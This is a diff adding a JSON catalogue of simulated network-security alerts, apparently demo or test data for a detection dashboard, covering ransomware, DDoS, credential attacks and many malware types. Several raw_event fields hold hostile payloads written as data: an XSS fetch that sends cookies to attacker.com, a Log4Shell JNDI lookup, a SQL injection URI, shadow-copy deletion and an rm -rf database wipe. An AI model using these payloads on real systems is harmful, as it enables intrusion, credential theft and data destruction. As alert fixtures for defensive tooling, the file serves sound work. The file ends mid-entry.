@@ -1,0 +1,1611 @@
+{
+  "LOCKBIT": {
+    "name": "LockBit 3.0 Ransomware Volume Shadow Deletion",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 99,
+    "dst_port": 445,
+    "protocol": "SMB",
+    "src_ip": "198.51.100.22",
+    "dst_ip": "10.240.20.88",
+    "signature": "Win32.Ransomware.LockBit3.0 Volume Shadow Deletion via vssadmin",
+    "raw_event": {
+      "command": "vssadmin.exe delete shadows /all /quiet",
+      "target": "DC01"
+    }
+  },
+  "SYN_FLOOD": {
+    "name": "Mirai Botnet TCP SYN Flood Saturation DDoS",
+    "category": "network",
+    "severity": "CRITICAL",
+    "risk_score": 94,
+    "dst_port": 80,
+    "protocol": "TCP",
+    "src_ip": "194.26.29.112",
+    "dst_ip": "10.240.0.1",
+    "signature": "Mirai IoT SYN Flood Distributed Denial of Service (> 1.2M pps)",
+    "raw_event": {
+      "pps": 1200000,
+      "flag": "SYN"
+    }
+  },
+  "KERBEROAST": {
+    "name": "Active Directory Kerberoasting Service Ticket Theft",
+    "category": "credential",
+    "severity": "HIGH",
+    "risk_score": 94,
+    "dst_port": 88,
+    "protocol": "Kerberos",
+    "src_ip": "10.240.15.44",
+    "dst_ip": "10.240.10.4",
+    "signature": "Kerberoasting Active Directory Ticket Request (RC4-HMAC downgrade)",
+    "raw_event": {
+      "spn": "MSSQLSvc/db-vault.prod:1433",
+      "encryption": "rc4-hmac"
+    }
+  },
+  "SQLI": {
+    "name": "SQL Injection Database Schema Extraction",
+    "category": "web_api",
+    "severity": "CRITICAL",
+    "risk_score": 98,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.99",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SPECIFIC_APPS SQL Injection in URI parameter 'id=1 UNION SELECT * FROM users'",
+    "raw_event": {
+      "uri": "/api/v1/customers?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
+      "method": "GET",
+      "user_agent": "sqlmap/1.7.2#stable"
+    }
+  },
+  "LOG4J": {
+    "name": "Apache Log4Shell JNDI Remote Code Execution",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 98,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.5",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET EXPLOIT Apache Log4j JNDI RCE (CVE-2021-44228)",
+    "raw_event": {
+      "jndi_payload": "${jndi:ldap://185.220.101.5:1389/Exploit}",
+      "cve": "CVE-2021-44228"
+    }
+  },
+  "DATA_EXFIL": {
+    "name": "DNS Tunneling Sensitive Database Exfiltration",
+    "category": "post_compromise",
+    "severity": "CRITICAL",
+    "risk_score": 97,
+    "dst_port": 53,
+    "protocol": "DNS",
+    "src_ip": "10.240.20.88",
+    "dst_ip": "45.33.32.10",
+    "signature": "ET POST_COMPROMISE Data Exfiltration Over DNS Tunnel (Base64 Chunked)",
+    "raw_event": {
+      "bytes_exfiltrated": 15400000,
+      "tunnel_domain": "exfil.attacker-dns.org"
+    }
+  },
+  "TROJAN": {
+    "name": "Cobalt Strike Malleable C2 Trojan Beacon",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 96,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "45.33.32.156",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET TROJAN Cobalt Strike Malleable C2 HTTPS Beacon",
+    "raw_event": {
+      "beacon_sleep": 30,
+      "jitter": 15
+    }
+  },
+  "DDOS": {
+    "name": "Volumetric UDP / DNS Reflection DDoS Attack",
+    "category": "network",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "dst_port": 53,
+    "protocol": "UDP",
+    "src_ip": "194.26.29.50",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET DDoS Volumetric UDP Reflection Flood (> 50 Gbps)",
+    "raw_event": {
+      "gbps": 52.4,
+      "pps": 48000000
+    }
+  },
+  "BRUTE_FORCE": {
+    "name": "SSH Administrative Credential Brute Force Attack",
+    "category": "credential",
+    "severity": "HIGH",
+    "risk_score": 94,
+    "dst_port": 22,
+    "protocol": "SSH",
+    "src_ip": "198.51.100.42",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET POLICY SSH Brute Force Key Extraction (> 500 Failed Auth/min)",
+    "raw_event": {
+      "failed_attempts": 524,
+      "tool": "hydra/v9.4"
+    }
+  },
+  "XSS": {
+    "name": "Stored Cross-Site Scripting Cookie Exfiltration",
+    "category": "web_api",
+    "severity": "HIGH",
+    "risk_score": 88,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.88",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_SPECIFIC_APPS Cross-Site Scripting <script>document.cookie exfil",
+    "raw_event": {
+      "script": "<script>fetch('http://attacker.com/c?c='+document.cookie)</script>"
+    }
+  },
+  "RCE": {
+    "name": "Spring4Shell Remote Code Execution Ingress Attempt",
+    "category": "exploitation",
+    "severity": "CRITICAL",
+    "risk_score": 99,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.99",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET EXPLOIT Spring4Shell Remote Code Execution (CVE-2022-22965)",
+    "raw_event": {
+      "class_loader_override": "class.module.classLoader.resources.context.parent.pipeline.first.pattern"
+    }
+  },
+  "LATER_MOVEMENT": {
+    "name": "PsExec Administrative Remote Command Execution",
+    "category": "post_compromise",
+    "severity": "CRITICAL",
+    "risk_score": 94,
+    "dst_port": 445,
+    "protocol": "SMB",
+    "src_ip": "10.240.15.44",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET POST_COMPROMISE PsExec Remote Service Creation Lateral Movement",
+    "raw_event": {
+      "service_created": "PSEXESVC.exe",
+      "command": "cmd.exe /c whoami"
+    }
+  },
+  "WORM": {
+    "name": "WannaCry EternalBlue Network Worm Propagation",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 97,
+    "dst_port": 445,
+    "protocol": "SMB",
+    "src_ip": "185.220.101.99",
+    "dst_ip": "10.240.15.50",
+    "signature": "ET EXPLOIT EternalBlue MS17-010 WannaCry Worm Propagation (CVE-2017-0144)",
+    "raw_event": {
+      "exploit": "MS17-010",
+      "propagation_subnet": "10.240.15.0/24",
+      "cve": "CVE-2017-0144"
+    }
+  },
+  "RAT": {
+    "name": "AsyncRAT Remote Access Trojan Command Control",
+    "category": "malware",
+    "severity": "HIGH",
+    "risk_score": 93,
+    "dst_port": 6606,
+    "protocol": "TCP",
+    "src_ip": "193.142.58.12",
+    "dst_ip": "10.240.15.12",
+    "signature": "ET TROJAN AsyncRAT SSL C2 Beacon (Client Registration Packet)",
+    "raw_event": {
+      "client_id": "FIN-PC09",
+      "plugin": "Keylogger.dll",
+      "screen_capture": true
+    }
+  },
+  "ROOTKIT": {
+    "name": "Linux Kernel ld.so.preload Library Rootkit",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "dst_port": 22,
+    "protocol": "SSH",
+    "src_ip": "10.240.10.45",
+    "dst_ip": "10.240.10.1",
+    "signature": "ET TROJAN Linux Rootkit ld.so.preload Library Injection (Defense Evasion)",
+    "raw_event": {
+      "preload_path": "/etc/ld.so.preload",
+      "library": "librootkit.so",
+      "killed": "syslogd"
+    }
+  },
+  "INFOSTEALER": {
+    "name": "RedLine Infostealer Browser Credentials Extraction",
+    "category": "malware",
+    "severity": "HIGH",
+    "risk_score": 94,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "45.154.255.10",
+    "dst_ip": "10.240.15.88",
+    "signature": "ET TROJAN RedLine Infostealer SQLite Credential Vault Exfiltration",
+    "raw_event": {
+      "exfil_db": "Chrome_Login_Data.db",
+      "cookies": true,
+      "crypto_wallets": true
+    }
+  },
+  "VIRUS": {
+    "name": "Polymorphic File-Infecting Virus Propagation",
+    "category": "malware",
+    "severity": "HIGH",
+    "risk_score": 89,
+    "dst_port": 445,
+    "protocol": "SMB",
+    "src_ip": "10.240.15.33",
+    "dst_ip": "10.240.15.0",
+    "signature": "ET MALWARE Win32.Virus.Polymorphic File Infector Network Spread",
+    "raw_event": {
+      "infected_files": 142,
+      "mutation_engine": true,
+      "spread_via": "SMB shares"
+    }
+  },
+  "SPYWARE": {
+    "name": "FinFisher Commercial Spyware Activity",
+    "category": "malware",
+    "severity": "HIGH",
+    "risk_score": 91,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "91.108.4.200",
+    "dst_ip": "10.240.15.77",
+    "signature": "ET MALWARE FinFisher Spyware Encrypted C2 Beacon (Covert Surveillance)",
+    "raw_event": {
+      "c2_domain": "finfisher-c2.net",
+      "audio_capture": true,
+      "location_tracking": true
+    }
+  },
+  "ADWARE": {
+    "name": "Aggressive Adware Browser Hijack and Redirect",
+    "category": "malware",
+    "severity": "LOW",
+    "risk_score": 45,
+    "dst_port": 80,
+    "protocol": "HTTP",
+    "src_ip": "203.0.113.55",
+    "dst_ip": "10.240.15.44",
+    "signature": "ET ADWARE Aggressive Browser Hijacker Redirect Chain Detected",
+    "raw_event": {
+      "hijacked_homepage": true,
+      "redirects": 8,
+      "pua_name": "SearchDefault"
+    }
+  },
+  "KEYLOGGER": {
+    "name": "Hardware Keylogger Firmware Credential Harvesting",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 96,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "10.240.15.99",
+    "dst_ip": "45.33.32.200",
+    "signature": "ET MALWARE Keylogger Batch Upload Credential Harvest (Keystroke Buffer Flush)",
+    "raw_event": {
+      "keystrokes_captured": 48200,
+      "passwords_extracted": 12,
+      "exfil_size_kb": 34
+    }
+  },
+  "BOTNET_MALWARE": {
+    "name": "Mirai Botnet C2 Registration and Command Receipt",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "dst_port": 23,
+    "protocol": "Telnet",
+    "src_ip": "193.142.58.80",
+    "dst_ip": "10.240.15.100",
+    "signature": "ET TROJAN Mirai Botnet C2 Registration and Command Channel Active",
+    "raw_event": {
+      "bot_id": "MR-3K9X",
+      "c2_cmd": "ATTACK 10.240.0.1 80 60",
+      "iot_device": "IP Camera"
+    }
+  },
+  "BACKDOOR": {
+    "name": "Persistent Bind Shell Backdoor on TCP 31337",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 97,
+    "dst_port": 31337,
+    "protocol": "TCP",
+    "src_ip": "45.33.32.177",
+    "dst_ip": "10.240.15.25",
+    "signature": "ET MALWARE Bind Shell Backdoor Listen Port 31337 (Persistent Access)",
+    "raw_event": {
+      "listen_port": 31337,
+      "shell": "/bin/bash",
+      "persistence": "systemd unit"
+    }
+  },
+  "LOGIC_BOMB": {
+    "name": "Scheduled Logic Bomb Payload Detonation",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 98,
+    "dst_port": 0,
+    "protocol": "LOCAL",
+    "src_ip": "10.240.10.88",
+    "dst_ip": "10.240.20.88",
+    "signature": "ET MALWARE Logic Bomb Trigger Condition Met -- Scheduled Destructive Payload",
+    "raw_event": {
+      "trigger": "date==2026-01-01",
+      "payload": "rm -rf /var/lib/postgres/*",
+      "time_to_trigger_ms": 0
+    }
+  },
+  "FILELESS_MALWARE": {
+    "name": "PowerShell Fileless Malware Memory Injection",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 96,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "10.240.15.66",
+    "dst_ip": "185.220.101.5",
+    "signature": "ET EXPLOIT Fileless PowerShell Reflective DLL Injection (In-Memory Execution)",
+    "raw_event": {
+      "method": "Reflective DLL Injection",
+      "process": "powershell.exe",
+      "disk_artifacts": false
+    }
+  },
+  "BOOTKIT": {
+    "name": "Bootkit MBR Infection Persistence Mechanism",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 97,
+    "dst_port": 0,
+    "protocol": "LOCAL",
+    "src_ip": "10.240.15.10",
+    "dst_ip": "10.240.15.10",
+    "signature": "ET MALWARE Bootkit MBR Overwrite Detected (Pre-OS Persistence Stage)",
+    "raw_event": {
+      "mbr_written": true,
+      "sector": 0,
+      "bootkit_name": "Mebromi",
+      "pre_os_hook": true
+    }
+  },
+  "CRYPTOJACKING": {
+    "name": "XMRig Cryptojacking Unauthorized Mining Activity",
+    "category": "malware",
+    "severity": "MEDIUM",
+    "risk_score": 72,
+    "dst_port": 3333,
+    "protocol": "TCP",
+    "src_ip": "10.240.15.55",
+    "dst_ip": "45.33.32.99",
+    "signature": "ET MALWARE XMRig Monero Cryptominer Pool Connection (Unauthorized Mining)",
+    "raw_event": {
+      "miner": "xmrig/6.20.0",
+      "pool": "pool.xmr.org:3333",
+      "hashrate_khs": 4200
+    }
+  },
+  "WIPER_MALWARE": {
+    "name": "HermeticWiper Destructive Disk Wipe Campaign",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 100,
+    "dst_port": 445,
+    "protocol": "SMB",
+    "src_ip": "195.88.54.10",
+    "dst_ip": "10.240.20.88",
+    "signature": "ET MALWARE HermeticWiper Destructive Payload MBR/Partition Overwrite",
+    "raw_event": {
+      "driver": "EaseUS Partition Master signed",
+      "target": "MBR+partitions",
+      "recovery": "impossible"
+    }
+  },
+  "LOADER_MALWARE": {
+    "name": "IcedID Loader Secondary Payload Stage Drop",
+    "category": "malware",
+    "severity": "HIGH",
+    "risk_score": 90,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.44",
+    "dst_ip": "10.240.15.33",
+    "signature": "ET TROJAN IcedID Loader Secondary Payload HTTP Download Stage",
+    "raw_event": {
+      "loader": "IcedID",
+      "payload_url": "https://cdn-update.net/payload.bin",
+      "stage": 2
+    }
+  },
+  "BANKING_TROJAN": {
+    "name": "TrickBot Banking Trojan Web Inject",
+    "category": "malware",
+    "severity": "CRITICAL",
+    "risk_score": 96,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.225.17.55",
+    "dst_ip": "10.240.15.22",
+    "signature": "ET TROJAN TrickBot Banking Trojan Web Inject Financial Portal Hijack",
+    "raw_event": {
+      "target_bank": "bankofamerica.com",
+      "inject_type": "form_grabber",
+      "creds_stolen": true
+    }
+  },
+  "MOBILE_MALWARE": {
+    "name": "FluBot Android SMS Banking Malware Campaign",
+    "category": "malware",
+    "severity": "HIGH",
+    "risk_score": 88,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "91.108.56.180",
+    "dst_ip": "10.240.15.55",
+    "signature": "ET TROJAN FluBot Android SMS Spyware C2 Registration (Mobile Device)",
+    "raw_event": {
+      "platform": "Android",
+      "sms_contacts_stolen": 186,
+      "banking_apps_targeted": [
+        "HDFC",
+        "ICICI"
+      ]
+    }
+  },
+  "DOS": {
+    "name": "Resource Exhaustion Denial of Service Attack",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 85,
+    "dst_port": 80,
+    "protocol": "TCP",
+    "src_ip": "185.220.101.12",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET DOS Resource Exhaustion HTTP Slowloris Attack (Connection Starvation)",
+    "raw_event": {
+      "connections": 10000,
+      "technique": "Slowloris",
+      "target_saturated": true
+    }
+  },
+  "UDP_FLOOD": {
+    "name": "UDP Packet Flood Traffic Saturation Attack",
+    "category": "network",
+    "severity": "CRITICAL",
+    "risk_score": 92,
+    "dst_port": 0,
+    "protocol": "UDP",
+    "src_ip": "194.26.29.88",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET DOS UDP Flood Random Port Saturation Attack (> 10 Gbps)",
+    "raw_event": {
+      "gbps": 10.5,
+      "pps": 14000000,
+      "random_ports": true
+    }
+  },
+  "ICMP_FLOOD": {
+    "name": "ICMP Echo Request Ping Flood Attack",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 82,
+    "dst_port": 0,
+    "protocol": "ICMP",
+    "src_ip": "203.0.113.44",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET DOS ICMP Echo Request Flood Detected (Ping Flood > 100k pps)",
+    "raw_event": {
+      "type": 8,
+      "code": 0,
+      "pps": 120000,
+      "spoofed_src": true
+    }
+  },
+  "PING_OF_DEATH": {
+    "name": "Oversized ICMP Ping of Death Packet",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 80,
+    "dst_port": 0,
+    "protocol": "ICMP",
+    "src_ip": "198.51.100.66",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET DOS Ping of Death Oversized Fragmented ICMP Packet (> 65535 bytes)",
+    "raw_event": {
+      "packet_size_bytes": 65600,
+      "fragmented": true,
+      "target_crash_risk": "HIGH"
+    }
+  },
+  "SMURF_ATTACK": {
+    "name": "ICMP Amplification Smurf Broadcast Attack",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 83,
+    "dst_port": 0,
+    "protocol": "ICMP",
+    "src_ip": "203.0.113.77",
+    "dst_ip": "10.240.255.255",
+    "signature": "ET DOS Smurf Attack ICMP Broadcast Amplification (Spoofed Source)",
+    "raw_event": {
+      "broadcast_addr": "10.240.255.255",
+      "amplification_factor": 254,
+      "victim": "10.240.0.1"
+    }
+  },
+  "FRAGGLE_ATTACK": {
+    "name": "UDP Fraggle Broadcast Amplification Attack",
+    "category": "network",
+    "severity": "MEDIUM",
+    "risk_score": 75,
+    "dst_port": 7,
+    "protocol": "UDP",
+    "src_ip": "203.0.113.33",
+    "dst_ip": "10.240.255.255",
+    "signature": "ET DOS Fraggle Attack UDP Echo Broadcast Amplification",
+    "raw_event": {
+      "port": "7 echo",
+      "broadcast": true,
+      "amplification_factor": 200
+    }
+  },
+  "DNS_AMPLIFICATION": {
+    "name": "DNS ANY Reflection Amplification DDoS",
+    "category": "network",
+    "severity": "CRITICAL",
+    "risk_score": 93,
+    "dst_port": 53,
+    "protocol": "UDP",
+    "src_ip": "195.88.54.55",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET DOS DNS ANY Query Amplification Attack (> 100x amplification factor)",
+    "raw_event": {
+      "query_type": "ANY",
+      "amplification_factor": 140,
+      "gbps": 15.2
+    }
+  },
+  "NTP_AMPLIFICATION": {
+    "name": "NTP MONLIST Reflection Amplification DDoS",
+    "category": "network",
+    "severity": "CRITICAL",
+    "risk_score": 92,
+    "dst_port": 123,
+    "protocol": "UDP",
+    "src_ip": "45.33.32.88",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET DOS NTP MONLIST Response Amplification DDoS (556x amplification)",
+    "raw_event": {
+      "command": "MONLIST",
+      "amplification_factor": 556,
+      "gbps": 22.4
+    }
+  },
+  "ARP_SPOOF": {
+    "name": "Subnet Man-in-the-Middle ARP Cache Poisoning",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 90,
+    "dst_port": 0,
+    "protocol": "ARP",
+    "src_ip": "10.240.15.200",
+    "dst_ip": "10.240.15.1",
+    "signature": "ET ARP Spoofing Gratuitous ARP Poison -- Gateway Impersonation",
+    "raw_event": {
+      "rogue_mac": "00:11:22:33:44:55",
+      "target_ip": "10.240.15.1",
+      "gratuitous": true
+    }
+  },
+  "ARP_POISONING": {
+    "name": "ARP Cache Table Corruption Attack",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 87,
+    "dst_port": 0,
+    "protocol": "ARP",
+    "src_ip": "10.240.15.188",
+    "dst_ip": "10.240.15.1",
+    "signature": "ET ARP Cache Poisoning Conflicting ARP Replies Detected (MITM Setup)",
+    "raw_event": {
+      "poisoned_entries": 12,
+      "victims": [
+        "10.240.15.2",
+        "10.240.15.3"
+      ],
+      "redirected": true
+    }
+  },
+  "MAC_FLOODING": {
+    "name": "CAM Table MAC Address Flooding Switch Attack",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 84,
+    "dst_port": 0,
+    "protocol": "Ethernet",
+    "src_ip": "10.240.15.77",
+    "dst_ip": "10.240.15.254",
+    "signature": "ET NETWORK MAC Address Table Flooding Attack (CAM Table Overflow)",
+    "raw_event": {
+      "fake_macs": 130000,
+      "switch_model": "Cisco 3850",
+      "cam_overflow": true
+    }
+  },
+  "DHCP_STARVATION": {
+    "name": "DHCP Pool Starvation Address Exhaustion",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 82,
+    "dst_port": 67,
+    "protocol": "UDP",
+    "src_ip": "10.240.15.199",
+    "dst_ip": "255.255.255.255",
+    "signature": "ET NETWORK DHCP Pool Starvation Attack (Address Space Exhaustion)",
+    "raw_event": {
+      "discover_pps": 15000,
+      "pool_exhausted": true,
+      "tool": "Gobbler"
+    }
+  },
+  "DHCP_SPOOFING": {
+    "name": "Rogue DHCP Server Configuration Injection",
+    "category": "network",
+    "severity": "CRITICAL",
+    "risk_score": 91,
+    "dst_port": 68,
+    "protocol": "UDP",
+    "src_ip": "10.240.15.198",
+    "dst_ip": "255.255.255.255",
+    "signature": "ET NETWORK Rogue DHCP Server Offer Detected (Malicious Gateway/DNS Injection)",
+    "raw_event": {
+      "rogue_gateway": "10.240.15.198",
+      "rogue_dns": "10.240.15.198",
+      "clients_affected": 47
+    }
+  },
+  "DNS_SPOOF": {
+    "name": "Rogue DNS Cache Poisoning and Forged Record",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 91,
+    "dst_port": 53,
+    "protocol": "UDP",
+    "src_ip": "198.51.100.77",
+    "dst_ip": "10.240.10.2",
+    "signature": "ET DNS Cache Poisoning Forged A-Record Response (Transaction ID Hijack)",
+    "raw_event": {
+      "forged_domain": "auth.bank.internal",
+      "forged_ip": "198.51.100.77",
+      "txid_guessed": true
+    }
+  },
+  "DNS_CACHE_POISON": {
+    "name": "Kaminsky-Style DNS Cache Poisoning Attack",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 88,
+    "dst_port": 53,
+    "protocol": "UDP",
+    "src_ip": "203.0.113.100",
+    "dst_ip": "10.240.10.2",
+    "signature": "ET DNS Kaminsky Cache Poisoning Rapid Transaction ID Flood",
+    "raw_event": {
+      "txid_attempts": 65535,
+      "target_resolver": "10.240.10.2",
+      "poisoned": true
+    }
+  },
+  "DNS_TUNNELING": {
+    "name": "DNS Covert Channel Data Exfiltration Tunnel",
+    "category": "network",
+    "severity": "CRITICAL",
+    "risk_score": 94,
+    "dst_port": 53,
+    "protocol": "UDP",
+    "src_ip": "10.240.20.55",
+    "dst_ip": "8.8.8.8",
+    "signature": "ET DNS Tunneling Covert Channel High-Entropy Subdomain Query Pattern",
+    "raw_event": {
+      "avg_subdomain_length": 63,
+      "entropy": 7.8,
+      "tool": "iodine",
+      "mb_tunneled": 8.4
+    }
+  },
+  "IP_SPOOF": {
+    "name": "Raw Socket IP Header Forgery and Ingress Spoofing",
+    "category": "network",
+    "severity": "MEDIUM",
+    "risk_score": 85,
+    "dst_port": 443,
+    "protocol": "TCP",
+    "src_ip": "203.0.113.99",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET POLICY IP Spoofing Detected X-Forwarded-For Internal IP Bypass Attempt",
+    "raw_event": {
+      "spoofed_header": "X-Forwarded-For: 127.0.0.1",
+      "bypass_target": "/admin/console"
+    }
+  },
+  "SESSION_HIJACK": {
+    "name": "Stolen JWT Cookie Replay Session Hijacking",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 92,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.33",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET WEB_CLIENT Session Token Replay Attack -- Stolen JWT Bearer",
+    "raw_event": {
+      "token_type": "JWT",
+      "stolen_from": "MITM intercept",
+      "target_api": "/api/v1/admin/users"
+    }
+  },
+  "MITM": {
+    "name": "Man-in-the-Middle Network Traffic Interception",
+    "category": "network",
+    "severity": "CRITICAL",
+    "risk_score": 95,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "10.240.15.200",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET NETWORK Man-in-the-Middle TLS Interception Proxy Certificate Mismatch",
+    "raw_event": {
+      "technique": "ARP+SSL",
+      "cert_mismatch": true,
+      "intercepted_sessions": 14
+    }
+  },
+  "MAN_IN_BROWSER": {
+    "name": "Man-in-the-Browser Malware DOM Manipulation",
+    "category": "network",
+    "severity": "CRITICAL",
+    "risk_score": 96,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "185.220.101.22",
+    "dst_ip": "10.240.15.44",
+    "signature": "ET TROJAN Man-in-the-Browser SpyEye DOM Injection Financial Transaction Tamper",
+    "raw_event": {
+      "browser": "Chrome",
+      "inject_target": "banking-portal.com",
+      "transaction_modified": true
+    }
+  },
+  "SSL_STRIP": {
+    "name": "SSL/TLS Stripping HTTPS Downgrade Attack",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 88,
+    "dst_port": 80,
+    "protocol": "HTTP",
+    "src_ip": "10.240.15.200",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET NETWORK SSL Strip HTTPS Downgrade Attack (HSTS Bypass)",
+    "raw_event": {
+      "tool": "sslstrip2",
+      "hsts_bypassed": true,
+      "victims": 3
+    }
+  },
+  "REPLAY_ATTACK": {
+    "name": "Authentication Token Replay Attack",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 87,
+    "dst_port": 88,
+    "protocol": "Kerberos",
+    "src_ip": "198.51.100.44",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET POLICY Kerberos Replay Attack Detected -- Duplicate Authenticator Timestamp",
+    "raw_event": {
+      "ticket_replayed": true,
+      "skew_seconds": 0,
+      "target": "LDAP service"
+    }
+  },
+  "EVIL_TWIN": {
+    "name": "Evil Twin Rogue AP SSID Impersonation",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 86,
+    "dst_port": 0,
+    "protocol": "802.11",
+    "src_ip": "10.240.50.100",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET WIRELESS Evil Twin Access Point SSID Spoof Detected (Corporate SSID Cloned)",
+    "raw_event": {
+      "cloned_ssid": "Corp-WiFi-Secure",
+      "rogue_bssid": "AA:BB:CC:DD:EE:FF",
+      "clients_hijacked": 2
+    }
+  },
+  "WIFI_DEAUTH": {
+    "name": "Wi-Fi Deauthentication Forced Disconnect Attack",
+    "category": "network",
+    "severity": "MEDIUM",
+    "risk_score": 73,
+    "dst_port": 0,
+    "protocol": "802.11",
+    "src_ip": "10.240.50.99",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET WIRELESS Deauthentication Frame Flood -- Client Forced Disconnect (DoS)",
+    "raw_event": {
+      "deauth_frames_per_sec": 100,
+      "target_clients": 8,
+      "reason_code": 7
+    }
+  },
+  "WIFI_EAVESDROP": {
+    "name": "Passive Wi-Fi Traffic Eavesdropping Monitor Mode",
+    "category": "network",
+    "severity": "MEDIUM",
+    "risk_score": 70,
+    "dst_port": 0,
+    "protocol": "802.11",
+    "src_ip": "10.240.50.77",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET WIRELESS Monitor Mode Passive Eavesdrop Capture (WPA2 Handshake Sniff)",
+    "raw_event": {
+      "mode": "monitor",
+      "handshakes_captured": 3,
+      "tool": "airodump-ng"
+    }
+  },
+  "BLUETOOTH_ATTACK": {
+    "name": "BlueBorne Bluetooth Remote Code Execution",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 86,
+    "dst_port": 0,
+    "protocol": "Bluetooth",
+    "src_ip": "10.240.50.55",
+    "dst_ip": "10.240.15.77",
+    "signature": "ET BLUETOOTH BlueBorne RCE Stack Overflow (CVE-2017-0781) -- No Pairing Required",
+    "raw_event": {
+      "cve": "CVE-2017-0781",
+      "target_device": "Android 7.1",
+      "requires_pairing": false
+    }
+  },
+  "ROGUE_AP": {
+    "name": "Rogue Unauthorized Access Point Network Insertion",
+    "category": "network",
+    "severity": "HIGH",
+    "risk_score": 84,
+    "dst_port": 0,
+    "protocol": "802.11",
+    "src_ip": "10.240.50.88",
+    "dst_ip": "10.240.0.1",
+    "signature": "ET WIRELESS Rogue Access Point Detected -- Unauthorized AP Connected to Corporate LAN",
+    "raw_event": {
+      "rogue_ssid": "Free-WiFi",
+      "connected_to_switch_port": "SW01:Fa0/24",
+      "clients": 5
+    }
+  },
+  "PASS_SPRAY": {
+    "name": "Active Directory Password Spraying Campaign",
+    "category": "credential",
+    "severity": "HIGH",
+    "risk_score": 91,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "198.51.100.10",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET CREDENTIAL Password Spraying AD -- Single Password 100+ Accounts (Lockout Evasion)",
+    "raw_event": {
+      "password_tested": "Winter2026!",
+      "accounts_targeted": 105,
+      "successes": 2
+    }
+  },
+  "CRED_STUFF": {
+    "name": "Automated Breach Dump Credential Stuffing",
+    "category": "credential",
+    "severity": "HIGH",
+    "risk_score": 93,
+    "dst_port": 443,
+    "protocol": "HTTPS",
+    "src_ip": "45.154.255.88",
+    "dst_ip": "10.240.10.12",
+    "signature": "ET CREDENTIAL Credential Stuffing Breach Combo List Login API (High Velocity)",
+    "raw_event": {
+      "combo_list": "COMB_2021",
+      "attempts_per_min": 850,
+      "success_rate": 0.003
+    }
+  },
+  "PASS_HASH": {
+    "name": "NTLM Pass-the-Hash Privilege Impersonation",
+    "category": "credential",
+    "severity": "CRITICAL",
+    "risk_score": 96,
+    "dst_port": 445,
+    "protocol": "SMB",
+    "src_ip": "10.240.15.44",
+    "dst_ip": "10.240.10.4",
+    "signature": "ET CREDENTIAL NTLM Pass-the-Hash SMB Authentication (No Plaintext Required)",
+    "raw_event": {
